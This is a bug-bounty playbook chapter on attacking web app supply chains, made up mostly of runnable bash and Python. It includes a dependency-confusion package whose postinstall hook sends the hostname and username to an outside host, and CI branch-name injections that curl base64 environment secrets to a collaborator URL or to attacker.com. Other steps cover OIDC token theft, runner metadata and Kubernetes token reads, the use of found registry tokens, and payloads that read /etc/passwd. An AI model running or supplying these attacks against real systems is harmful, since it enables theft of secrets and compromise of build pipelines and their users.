# 12 — Web App Supply Chain Attacks (P1/Critical Focus)

## Mental Model

The supply chain is **every trust boundary between source code and the running app**:
developer machine → build system → package registry → CI/CD → artifact store → CDN → browser.
Compromise anywhere = arbitrary code execution in prod or on every user's browser.

**Only report with working PoC or confirmed access — no theoretical findings here.**

---

## Attack 1 — Dependency Confusion (Internal Package Substitution)

### Step 1: Harvest ALL internal package names

```bash
T="target.com"

# Source A: exposed manifests/lockfiles
for path in /package.json /package-lock.json /yarn.lock /pnpm-lock.yaml /npm-shrinkwrap.json; do
  curl -sf "https://$T$path" -o "sc$(echo $path | tr /. __)" && echo "[GOT] $path"
done

# Source B: webpack source maps → internal node_modules paths
# webpack://./node_modules/@company/internal-pkg/index.js  ← gold
cat js.txt | sed 's/$/.map/' | httpx -silent -mc 200 | while read url; do
  curl -sL "$url" | python3 -c "
import json, sys, re
data = json.load(sys.stdin)
for src in data.get('sources', []):
    m = re.search(r'node_modules/(@[^/]+/[^/]+|[^@/][^/]+)', src)
    if m: print(m.group(1))
" 2>/dev/null
done | sort -u > source_map_pkgs.txt

# Source C: webcrack recovered modules → require() / import calls
grep -rh 'require(\|from "' recovered/ 2>/dev/null | \
  grep -oE '"@[a-zA-Z0-9_-]+/[a-zA-Z0-9_-]+"|"[a-z][a-z0-9_-]+"' | \
  tr -d '"' | sort -u | grep -v 'react\|lodash\|axios\|webpack\|babel\|node\|core-js' > bundle_pkgs.txt

# Source D: HAR file from browser session (Burp → Save items → HAR)
# jq -r '.log.entries[].request.headers[] | select(.name=="referer").value' session.har

# Source E: error messages (404 responses from internal CDN often expose package names)
cat all_urls.txt | httpx -silent -mc 404 -sr | grep -oE '@[a-zA-Z0-9_-]+/[a-zA-Z0-9_-]+' | sort -u

# Combine
cat source_map_pkgs.txt bundle_pkgs.txt sc__package.json 2>/dev/null | \
  jq -r '.dependencies,.devDependencies | keys[]' 2>/dev/null | \
  sort -u > all_pkg_names.txt

echo "[+] Total unique package names: $(wc -l < all_pkg_names.txt)"
```

### Step 2: Check claimability

```bash
# npm claimability (rate-limited: be gentle)
while read pkg; do
  [ -z "$pkg" ] && continue
  result=$(npm view "$pkg" name 2>&1)
  if echo "$result" | grep -q '404'; then
    echo "[CLAIMABLE-npm] $pkg"
  elif echo "$result" | grep -q 'registry.npmjs.org'; then
    echo "[EXISTS] $pkg $(npm view $pkg _npmUser 2>/dev/null)"
  fi
  sleep 0.3
done < all_pkg_names.txt

# Scoped packages: check if the @org scope itself is unclaimed
grep '^@' all_pkg_names.txt | cut -d'/' -f1 | sort -u | while read scope; do
  npm org ls "${scope#@}" 2>&1 | grep -q 'does not exist' && echo "[UNCLAIMED SCOPE] $scope"
done

# PyPI check
grep -f pip_names.txt <(curl -s "https://pypi.org/pypi/$pkg/json" 2>/dev/null | jq -r '.info.name')
```

### Step 3: PoC (non-destructive, phones home only)

```bash
# Create a benign proof-of-concept package
mkdir /tmp/confused_pkg && cat > /tmp/confused_pkg/package.json <<EOF
{
  "name": "@target-org/internal-package",
  "version": "9999.0.0",
  "description": "Dependency confusion PoC - not malicious",
  "scripts": {
    "postinstall": "node -e \"require('https').get('https://collaborator.target.com/dc?host='+require('os').hostname()+'&user='+require('os').userInfo().username)\""
  }
}
EOF
# Publish to npm (only if you have a registered npm account and the name is truly unclaimed)
# npm publish /tmp/confused_pkg --access public
# Report immediately - do NOT wait for it to be installed
```

---

## Attack 2 — GitHub Actions Workflow Injection → Secret Exfiltration

This is the #1 CI/CD supply chain bug paying on HackerOne/Bugcrowd today.

### Pattern: `pull_request_target` + untrusted input in `run:` step

```yaml
# Vulnerable workflow pattern — triggers on external PRs with WRITE access to secrets:
on: pull_request_target   # <-- WRITE access, secrets available

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # checks out PR branch code!
      - run: |
          echo "Testing branch: ${{ github.event.pull_request.head.ref }}"  # INJECTION POINT
```

### Finding vulnerable workflows

```bash
ORG="target-org"

# List all public repos
gh api "orgs/$ORG/repos?type=public&per_page=100" --jq '.[].name' | while read repo; do
  # Check for pull_request_target workflows
  gh api "repos/$ORG/$repo/contents/.github/workflows" --jq '.[].name' 2>/dev/null | while read wf; do
    content=$(gh api "repos/$ORG/$repo/contents/.github/workflows/$wf" --jq '.content' | base64 -d)
    if echo "$content" | grep -q 'pull_request_target'; then
      # Check for dangerous patterns
      if echo "$content" | grep -qE '\$\{\{ github\.event\.(pull_request\.(head\.(ref|sha|label)|body|title)|comment\.body|issue\.(title|body)) \}\}'; then
        echo "[VULNERABLE] $ORG/$repo/.github/workflows/$wf"
        # Also check if it checks out PR branch code
        echo "$content" | grep -A3 'checkout\|ref:'
      fi
    fi
  done
done

# Automated: use zizmor (GitHub Actions security scanner)
pip install zizmor 2>/dev/null
gh api "repos/$ORG/$repo/zipball" > repo.zip && unzip -q repo.zip -d repo_src/
zizmor repo_src/
```

### PoC: PR branch name injection

```bash
# Submit a PR with this branch name:
# "; curl -X POST https://COLLABORATOR_URL/ -d "$(env | base64)"; #

# If the branch name lands in a `run:` step without quoting → shell injection
# The CI environment has all secrets → they get exfiltrated to your collaborator URL

# Cleaner version via GitHub Actions expression injection:
# In a `name:` or `run:` field that uses ${{ github.event.pull_request.head.ref }}:
# branch name: ${{ secrets.GITHUB_TOKEN }}  → leaks token directly into logs
# branch name: $(curl attacker.com)          → executes curl in bash

# Safe PoC (no actual data exfil, just demonstrates exec):
git checkout -b 'test-$(id)'
git push origin 'test-$(id)'
# Submit PR from this branch → check if CI output shows uid/gid in logs
```

### OIDC Token Theft via Workflow Injection

```bash
# If the workflow has `permissions: id-token: write` and uses cloud OIDC:
# aws-actions/configure-aws-credentials  OR  google-github-actions/auth
# Injecting into such a workflow → steal the OIDC JWT → exchange for cloud credentials

# An OIDC JWT stolen from GitHub Actions can be exchanged for AWS credentials:
# POST https://sts.amazonaws.com/?Action=AssumeRoleWithWebIdentity
#   &WebIdentityToken=<stolen_oidc_jwt>
#   &RoleArn=arn:aws:iam::ACCOUNT:role/github-actions-role

# This gives you AWS credentials with whatever permissions the role has
# (often S3 write to production, ECS/EKS access, ECR push)
```

---

## Attack 3 — Self-Hosted Runner Takeover

```bash
# Self-hosted runners run in the company's infrastructure (internal network, cloud VPC)
# If a workflow uses a self-hosted runner AND has an injection vector:
# → Code runs on internal infrastructure
# → Access to internal services (databases, K8s API, EC2 metadata, VPC resources)

# Identify self-hosted runner usage in workflows:
echo "$content" | grep -i 'runs-on:' | grep -v 'ubuntu-latest\|windows-latest\|macos-latest'
# Any value other than GitHub-hosted = self-hosted (custom labels like "prod", "internal", "aws")

# PoC on a self-hosted runner that is injectable:
# 1. Confirm code execution (safe: `id`)
# 2. Check internal network access: `curl http://169.254.169.254/latest/meta-data/`
# 3. Check K8s service account: `cat /var/run/secrets/kubernetes.io/serviceaccount/token`
# 4. List AWS credentials: `aws sts get-caller-identity`
# Stop at identity — do not enumerate beyond proof of access
```

---

## Attack 4 — Internal Package Registry Access

```bash
# .npmrc with auth token → read private packages from internal registry
curl -sf "https://$T/.npmrc" | grep -E 'registry|_authToken|_auth|//'

# Typical .npmrc:
# @company:registry=https://npm.internal.company.com/
# //npm.internal.company.com/:_authToken=npm_xxxxxx

# If token found:
NPM_TOKEN="npm_xxxxxx"
REGISTRY="https://npm.internal.company.com/"
# List all packages accessible with this token
curl -s "${REGISTRY}-/v1/search?text=scope:company&size=100" \
  -H "Authorization: Bearer $NPM_TOKEN" | jq '.objects[].package | {name,version,description}'
# Read secrets from package content (package.json, config files, source code)
# → Escalate if you find credentials, internal API keys, or private endpoint URLs

# Artifactory / JFrog / Nexus
# These often have REST APIs for browsing
curl -s "https://artifactory.company.com/artifactory/api/storage/npm-local/" \
  -H "X-JFrog-Art-Api: $FOUND_TOKEN"
curl -s "https://artifactory.company.com/artifactory/api/npm/npm-local/-/v1/search" \
  -H "Authorization: Bearer $FOUND_TOKEN"
```

---

## Attack 5 — Terraform State Exposure → Cloud Credentials

```bash
# Terraform state often contains credentials, resource ARNs, and sensitive outputs IN PLAINTEXT
# Common storage backends: S3, GCS, Azure Blob, Terraform Cloud, GitLab

# S3 backend exposure (often misconfigured)
aws s3 ls s3://company-terraform-state/ 2>/dev/null
aws s3 cp s3://company-terraform-state/prod/terraform.tfstate - 2>/dev/null | \
  python3 -m json.tool | grep -iE 'password|secret|key|token|credential|access_key|private_key'

# Find the backend S3 bucket name (from exposed Terraform files or GitHub repos)
curl -sf "https://$T/terraform.tfstate" && echo "[EXPOSED] tfstate directly served"
gh search code "org:$ORG terraform.tfstate" 2>/dev/null | head -10

# GCS backend
gsutil ls gs://company-terraform-state/ 2>/dev/null
gsutil cat gs://company-terraform-state/prod/default.tfstate 2>/dev/null | \
  jq '.resources[].instances[].attributes | to_entries[] | select(.value|type=="string") | select(.value|length>20) | .key + ": " + .value'

# Terraform Cloud: check if workspace has public access
curl -s "https://app.terraform.io/api/v2/organizations/$ORG_SLUG/workspaces" \
  -H "Authorization: Bearer $TF_TOKEN"
```

---

## Attack 6 — CI/CD Artifact Store Misconfiguration

```bash
# CI builds artifacts (Docker images, .tar.gz, .zip) and stores them in S3/GCS/Azure
# If the bucket is writable by the public → replace the artifact with a backdoored version
# Next production deploy pulls the attacker's artifact

# Find artifact bucket from CI config / build logs
grep -rh 'artifact\|deploy\|release\|build' ci_*.yml 2>/dev/null | \
  grep -oE 's3://[a-zA-Z0-9._-]+|gs://[a-zA-Z0-9._-]+' | sort -u

# Test write access (use a harmless filename with .poc extension)
aws s3 cp /dev/null "s3://company-artifacts/poc-HUNTER-writetest.txt" 2>/dev/null && \
  echo "[WRITABLE] s3://company-artifacts"
# Immediately delete your test file
aws s3 rm "s3://company-artifacts/poc-HUNTER-writetest.txt" 2>/dev/null

# Docker registry — test push access
docker pull "$REGISTRY/company/app:latest" 2>/dev/null
echo "FROM alpine" | docker build -t "$REGISTRY/company/app:poc-test" - 2>/dev/null && \
  docker push "$REGISTRY/company/app:poc-test" 2>/dev/null && echo "[REGISTRY WRITABLE]"
```

---

## Attack 7 — GitHub Actions Cache Poisoning

```bash
# GitHub Actions cache is scoped by key + branch
# Known attack: a PR can read caches from the base branch (not vice versa in recent GitHub)
# But if a vulnerable workflow allows branch injection → write to a cache key the base branch reads

# Check if target's CI uses npm/yarn cache restore without hash verification
# Pattern: actions/cache with key: npm-${{ hashFiles('package-lock.json') }}
# If an attacker controls the cache key (via branch name) → inject malicious node_modules/

# Practical: less common now but check workflow cache restore patterns
echo "$content" | grep -A5 'actions/cache'
```

---

## Attack 8 — Docker Image Layer Secrets

```bash
# Dockerfile history exposes ALL layers including deleted credentials
# Even if a layer is removed with `RUN rm /credentials`, it's recoverable from the image

# Pull the public image and inspect all layers
docker pull "$TARGET_IMAGE:latest" 2>/dev/null
docker history --no-trunc "$TARGET_IMAGE:latest" 2>/dev/null | grep -iE 'secret|key|token|password|env\s'

# Dive tool: interactive layer explorer
dive "$TARGET_IMAGE:latest" 2>/dev/null

# Export all layer tarballs and grep them
docker save "$TARGET_IMAGE:latest" -o image.tar
mkdir image_layers && tar -xf image.tar -C image_layers/
find image_layers/ -name '*.tar' -exec tar -xf {} -C /tmp/layer_extract/ \; 2>/dev/null
grep -ri 'AWS_SECRET\|API_KEY\|password\|TOKEN' /tmp/layer_extract/ 2>/dev/null | head -20

# For registries: check if pull-without-auth works
crane ls "$REGISTRY" 2>/dev/null  # crane from google-go-containerregistry
curl -s "https://$REGISTRY/v2/_catalog" 2>/dev/null
curl -s "https://$REGISTRY/v2/company/app/tags/list" 2>/dev/null
```

---

## Attack 9 — Exposed Kubernetes / Helm Configs

```bash
# IaC exposure — K8s manifests in web roots or repositories
for path in /k8s.yml /kubernetes.yml /helm/values.yaml /values.yaml \
            /deployment.yaml /config/production.yaml; do
  curl -sf "https://$T$path" -o "k8s$(echo $path|tr /. __)" && \
    echo "[K8S EXPOSED] $path"
done

# Secrets in K8s manifests (base64-encoded but trivially decoded)
grep -h 'kind: Secret' k8s__*.yml 2>/dev/null -A20 | \
  grep -oE '[A-Za-z0-9+/]{20,}={0,2}' | while read b; do
    decoded=$(echo "$b" | base64 -d 2>/dev/null | strings)
    [ -n "$decoded" ] && echo "b64 decode: $decoded"
  done

# GitHub: search for org's K8s secrets
gh search code "org:$ORG kind: Secret" --extension yaml --limit 30 2>/dev/null | head -20
```

---

## Attack 10 — Indirect Dependency Confusion via Transitive Deps

```bash
# A PUBLIC package that one of the target's PRIVATE packages depends on
# uses a private internal package name as a dep → you don't need to find the private pkg directly
# you just need the public package's package.json to reference an unclaimed name

# Example: npm package "company-public-utils" has dep "@company/internal-auth"
# "@company/internal-auth" is not on npm → confusion → your version runs on install

# Method: find all packages published by the target org
npm search --registry https://registry.npmjs.org --json "$ORG_NAME" 2>/dev/null | \
  jq -r '.[].name' | while read pkg; do
    npm view "$pkg" dependencies --json 2>/dev/null | jq -r 'to_entries[].key' | while read dep; do
      npm view "$dep" name 2>&1 | grep -q '404' && echo "[TRANSITIVE CLAIMABLE] $dep (from $pkg)"
    done
  done
```

---

## Attack 11 — Abandoned npm Maintainer Account Takeover

```bash
# If the target uses a package where the maintainer's email domain is abandoned
# → claim the domain → password reset on npm → publish malicious version

# Find package maintainers
for pkg in $(cat all_pkg_names.txt | head -20); do
  npm view "$pkg" --json 2>/dev/null | jq -r '"[\($pkg)] maintainer: \(.maintainers[].email)"'
done

# Check if maintainer email domains are still active
# (passive: check domain registration, MX records)
for email in $(npm view lodash maintainers --json 2>/dev/null | jq -r '.[].email'); do
  domain="${email#*@}"
  whois "$domain" 2>/dev/null | grep -iE 'expir|not found|no match' && \
    echo "[DOMAIN ABANDONED] $domain → $email"
done
```

---

## Attack 12 — SRI Missing on CDN → CDN Subdomain Takeover Chain

```bash
# Check for <script src="https://cdn.company.com/..."> WITHOUT integrity= attribute
python3 - <<'PYEOF'
import re, requests
from bs4 import BeautifulSoup

HOST = "target.com"
for path in ['/', '/login', '/app']:
    r = requests.get(f"https://{HOST}{path}", timeout=10)
    soup = BeautifulSoup(r.text, 'html.parser')
    for tag in soup.find_all('script', src=True):
        src = tag.get('src','')
        if 'cdn.' in src or 'static.' in src or 'assets.' in src:
            if not tag.get('integrity'):
                print(f"[NO-SRI] {src}")
PYEOF

# For each no-SRI CDN domain, check for subdomain takeover
# If cdn.company.com → points to CloudFront that no longer exists → create your own distribution
# → serve malicious JS from that URL → no SRI = browser executes it = full XSS/ATO on every user

# CDN takeover confirmation:
dig CNAME cdn.company.com +short  # find the underlying CDN FQDN
curl -s "https://cdn.company.com/app.js" | head -3  # check for CDN error page
```

---

## Attack 13 — Build-Time Secret Injection via Infected Plugin

```bash
# Webpack / ESLint / Babel plugins loaded from npm can run arbitrary code at build time
# If any plugin the target uses is claimable (dep confusion) or has an abandoned maintainer
# → inject malicious plugin code → runs during CI/CD → exfiltrates build secrets

# Find all build tool plugins in package.json devDependencies
jq -r '.devDependencies | keys[]' package.json 2>/dev/null | \
  grep -iE 'webpack|babel|eslint|prettier|jest|rollup|vite|esbuild' > build_plugins.txt

# Check all for claimability
while read pkg; do
  npm view "$pkg" name 2>&1 | grep -q '404' && echo "[CLAIMABLE BUILD PLUGIN] $pkg"
done < build_plugins.txt
```

---

## Attack 14 — package.json "scripts" Injection via User-Provided Config

```bash
# Some SaaS platforms allow users to define their own package.json / build config
# → user adds scripts.postinstall → platform runs npm install → arbitrary code execution on platform

# Test: if the target is a CI/CD-as-a-service or Heroku-like platform that reads user's package.json
# Submit a package.json with:
{
  "name": "my-app",
  "scripts": {
    "postinstall": "curl https://COLLABORATOR_URL/$(whoami)",
    "prebuild": "cat /etc/passwd | base64"
  }
}
# If build platform runs npm install with user-supplied package.json → RCE
```

---

## Attack 15 — IaC Credential Exposure (Terraform / CloudFormation)

```bash
# CloudFormation templates in S3 often contain plaintext credentials / parameter defaults
aws s3 ls "s3://$ORG-cloudformation/" --no-sign-request 2>/dev/null
aws s3 cp "s3://$ORG-cloudformation/main.template" - --no-sign-request 2>/dev/null | \
  python3 -m json.tool | grep -iE '"Default".*key|password|secret|token' | head -20

# GitHub search for org's CloudFormation templates
gh search code "org:$ORG AWSTemplateFormatVersion" --extension json --limit 20 2>/dev/null

# Pulumi state: check if GCS/S3 backend is public
gsutil cat "gs://$ORG-pulumi/.pulumi/stacks/production.json" 2>/dev/null | \
  jq '.checkpoint.latest.resources[].outputs | to_entries[] | select(.value|type=="string") | select(.value|length>20)'
```

---

## Supply Chain Decision Table

| Signal | Severity | PoC Path |
|---|---|---|
| Internal package name unclaimed on npm/PyPI | **P1** | Claim package + postinstall phones home |
| Unclaimed @org scope on npm | **P1** | Claim scope → publish any @org/* |
| `pull_request_target` + untrusted input in `run:` | **P1** | PR with injected branch name → secret exfil |
| Self-hosted runner reachable + injectable | **P1** | Code exec on internal infra → metadata/K8s access |
| OIDC token exposed via workflow injection | **P1** | Exchange OIDC JWT → cloud credentials |
| Internal registry .npmrc token exposed | **P1** | List private packages, read secrets from source |
| Writable artifact store (S3/GCS bucket) | **P1** | Replace artifact → next deploy = backdoored |
| Terraform state file publicly readable | **P1** | Read state → plaintext cloud credentials |
| Docker registry world-pullable | P2 | Pull image → read layer secrets |
| Docker image layers contain deleted secrets | P2 | `docker history` + layer export + grep |
| SRI missing + CDN domain dangling (takeover) | **P1** | Claim CDN distribution → XSS on all users |
| Build plugin claimable via dep confusion | P1 | Plugin runs in CI → exfil build-time secrets |
| K8s manifests exposed with base64 secrets | **P1** | Decode base64 → cloud/DB credentials |
| CloudFormation template with plaintext defaults | P2 | Read template → default credentials in live stack? |
| Abandoned maintainer email domain | P1 | Claim domain → npm account takeover → hijack package |
| User-supplied package.json executed by platform | **P1** | postinstall script → RCE on platform |
